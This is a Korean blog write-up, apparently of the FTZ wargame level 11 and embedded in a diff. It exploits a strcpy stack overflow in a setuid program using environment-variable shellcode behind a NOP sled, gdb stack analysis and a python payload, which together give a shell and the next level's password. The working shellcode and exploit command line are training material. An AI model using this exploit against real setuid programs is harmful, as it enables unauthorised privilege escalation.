@@ -1,0 +1,192 @@
+I"�'<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level11 
+level11@~~~~<span class="s1">'s password: 
+[level11@ftz level11]$ ls 
+attackme  hint  public_html  tmp 
+[level11@ftz level11]$ cat hint 
+
+#include  &lt;stdio.h&gt;
+#include  &lt;stdlib.h&gt;
+
+int main( int argc, char *argv[] ) 
+{ 
+        char str[256]; 
+
+        setreuid( 3092, 3092 ); 
+        strcpy( str, argv[1] ); 
+        printf( str ); 
+} 
+
+
+[level11@ftz level11]$
+</span></code></pre></div></div>
+
+<p>level11/what!@#$?로 접속하자.
+아무래도 hint는 attakeme의 소스 파일일 것이다.
+이 프로그램의 문제는, strcpy에 있다.
+이 함수는 문자열을 복사해 주는 함수인데, 길이 제한을 생각하지 않고 복사한다.
+그러므로 버퍼오버플로우를 해낼 수 있는 것이다.
+우선 /tmp로 복사해오자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level11@ftz level11]<span class="nv">$ </span><span class="nb">cp </span>hint /tmp/a.c 
+<span class="o">[</span>level11@ftz level11]<span class="nv">$ </span><span class="nb">cd</span> /tmp 
+<span class="o">[</span>level11@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>a.c 
+
+<span class="c">#include  &lt;stdio.h&gt;</span>
+<span class="c">#include  &lt;stdlib.h&gt;</span>
+
+int main<span class="o">(</span> int argc, char <span class="k">*</span>argv[] <span class="o">)</span> 
+<span class="o">{</span> 
+        char str[256]<span class="p">;</span> 
+
+        setreuid<span class="o">(</span> 3092, 3092 <span class="o">)</span><span class="p">;</span> 
+        strcpy<span class="o">(</span> str, argv[1] <span class="o">)</span><span class="p">;</span> 
+        <span class="nb">printf</span><span class="o">(</span> str <span class="o">)</span><span class="p">;</span> 
+<span class="o">}</span> 
+
+<span class="o">[</span>level11@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> a a.c 
+<span class="o">[</span>level11@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>한글이 없으므로 바로 컴파일까지 돌렸다.
+이제부터 쉘 코드가 필요하다.
+쉘 코드는 프로그램을 실행시키게 해 주는 기계어이다.
+/bin/bash를 해주는 쉘 코드를 지역변수에 등록해주자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">code</span><span class="o">=</span><span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*100+"\x31\xc0\x31\xdb\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>\x90은 nop 문자이다. 아무런 행동을 취하지 않는 문자라고 생각하면 된다.
+앞에 \x90을 많이 채워 넣은 것은 nop슬레드라고 하며 주소값이 변경되도 쉘 코드가 문제 없이 실행되게 해 주기 위해 넣는다.
+env 명령어를 통해 지역 변수에 잘 올라갔는지 확인할 수 있다.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">PWD</span><span class="o">=</span>/home/level11 
+<span class="nv">LANG</span><span class="o">=</span>en_US.UTF-8 
+<span class="nv">PS1</span><span class="o">=[</span><span class="se">\u</span>@<span class="se">\h</span> <span class="se">\W</span><span class="o">]</span><span class="nv">$ </span>
+<span class="nv">SHLVL</span><span class="o">=</span>1 
+<span class="nv">HOME</span><span class="o">=</span>/home/level11 
+<span class="nv">BASH_ENV</span><span class="o">=</span>/home/level11/.bashrc 
+<span class="nv">LOGNAME</span><span class="o">=</span>level11 
+<span class="nv">SSH_CONNECTION</span><span class="o">=</span>192.168.194.1 51165 192.168.194.129 22 
+<span class="nv">code</span><span class="o">=</span>릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱먆릱릱릱릱릱릱릱릱릱릱릱릱??方F?1픐h//shh/bin됥PS됣됀? 
+                                                       ?1육? 
+<span class="nv">LESSOPEN</span><span class="o">=</span>|/usr/bin/lesspipe.sh %s 
+<span class="nv">G_BROKEN_FILENAMES</span><span class="o">=</span>1 
+<span class="nv">_</span><span class="o">=</span>/bin/env 
+<span class="o">[</span>level11@ftz level11]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>이제 이 환경변수의 주소를 찾아보자.
+C프로그램을 하나 만들자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level11@ftz tmp]<span class="nv">$ </span>vi find.c 
+<span class="o">[</span>level11@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> find find.c 
+<span class="o">[</span>level11@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>find.c 
+<span class="c">#include &lt;stdio.h&gt;</span>
+int main<span class="o">()</span> 
+<span class="o">{</span> 
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%x</span><span class="se">\n</span><span class="s2">"</span>,getenv<span class="o">(</span><span class="s2">"code"</span><span class="o">))</span><span class="p">;</span> 
+<span class="o">}</span> 
+<span class="o">[</span>level11@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>getenv()는 환경변수의 주소값을 얻는할을 한다.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level11@ftz tmp]<span class="nv">$ </span>./find 
+bfffff14
+</code></pre></div></div>
+
+<p>환경변수의 주소값을 알아냈다.</p>
+
+<p>이제 dbg를 돌려 공격할 방법을 찾아보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level11@ftz tmp]<span class="nv">$ </span>gdb a 
+GNU gdb Red Hat Linux <span class="o">(</span>5.3post-0.20021129.18rh<span class="o">)</span> 
+Copyright 2003 Free Software Foundation, Inc. 
+GDB is free software, covered by the GNU General Public License, and you are 
+welcome to change it and/or distribute copies of it under certain conditions. 
+Type <span class="s2">"show copying"</span> to see the conditions. 
+There is absolutely no warranty <span class="k">for </span>GDB.  Type <span class="s2">"show warranty"</span> <span class="k">for </span>details. 
+This GDB was configured as <span class="s2">"i386-redhat-linux-gnu"</span>... 
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel 
+<span class="o">(</span>gdb<span class="o">)</span> disas main 
+Dump of assembler code <span class="k">for function </span>main: 
+0x08048394 &lt;main+0&gt;:    push   ebp 
+0x08048395 &lt;main+1&gt;:    mov    ebp,esp 
+0x08048397 &lt;main+3&gt;:    sub    esp,0x108 
+0x0804839d &lt;main+9&gt;:    and    esp,0xfffffff0 
+0x080483a0 &lt;main+12&gt;:   mov    eax,0x0 
+0x080483a5 &lt;main+17&gt;:   sub    esp,eax 
+0x080483a7 &lt;main+19&gt;:   sub    esp,0x8 
+0x080483aa &lt;main+22&gt;:   push   0xc14 
+0x080483af &lt;main+27&gt;:   push   0xc14 
+0x080483b4 &lt;main+32&gt;:   call   0x80482c4  &lt;setreuid&gt;
+0x080483b9 &lt;main+37&gt;:   add    esp,0x10 
+0x080483bc &lt;main+40&gt;:   sub    esp,0x8 
+0x080483bf &lt;main+43&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+12] 
+0x080483c2 &lt;main+46&gt;:   add    eax,0x4 
+0x080483c5 &lt;main+49&gt;:   push   DWORD PTR <span class="o">[</span>eax] 
+0x080483c7 &lt;main+51&gt;:   lea    eax,[ebp-264] 
+0x080483cd &lt;main+57&gt;:   push   eax 
+0x080483ce &lt;main+58&gt;:   call   0x80482d4  &lt;strcpy&gt;
+0x080483d3 &lt;main+63&gt;:   add    esp,0x10 
+0x080483d6 &lt;main+66&gt;:   sub    esp,0xc 
+0x080483d9 &lt;main+69&gt;:   lea    eax,[ebp-264] 
+0x080483df &lt;main+75&gt;:   push   eax 
+0x080483e0 &lt;main+76&gt;:   call   0x80482b4  &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x080483e5 &lt;main+81&gt;:   add    esp,0x10 
+0x080483e8 &lt;main+84&gt;:   leave 
+0x080483e9 &lt;main+85&gt;:   ret 
+0x080483ea &lt;main+86&gt;:   nop 
+0x080483eb &lt;main+87&gt;:   nop 
+End of assembler dump. 
+<span class="o">(</span>gdb<span class="o">)</span>
+</code></pre></div></div>
+
+<p>main+3을 보면, 주소값을 0x108만큼 할당한다.
+이는 10진수 264이다.
+C 코드에서 254만큼 배열의 크기를 지정하는데, 왜 264일까?
+그것은 더미이다.
+gcc가 업데이트되며 프로그램이 컴파일될때 메모리에 더미가 생긴다.
+그러므로 스택의 상태는 이럴 것이다.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left"> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">RET</td>
+      <td>4</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">SFP</td>
+      <td>4</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">dummy</td>
+      <td>8</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">srt</td>
+      <td>256</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>RET에 아까 넣어 주었던 환경변수의 주소값을 채워 넣으면, 프로그램이 끝나며 /bin/bash가 실행될 것이다.
+str+dummy+SFP=268이므로 아무 값이나 268개를 채우고 그 뒤에 환경변수의 주소를 넣자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level11@ftz level11]<span class="nv">$ </span>./attackme <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"a"*268+"\x14\xff\xff\xbf"'</span><span class="si">)</span> 
+sh-2.05b<span class="nv">$ </span>my-pass 
+TERM environment variable not set. 
+
+Level12 Password is <span class="s2">"it is like this"</span><span class="nb">.</span> 
+
+sh-2.05b<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>성공이다.</p>
+
+<p>level12’s password:”it is like this”</p>
+:ET
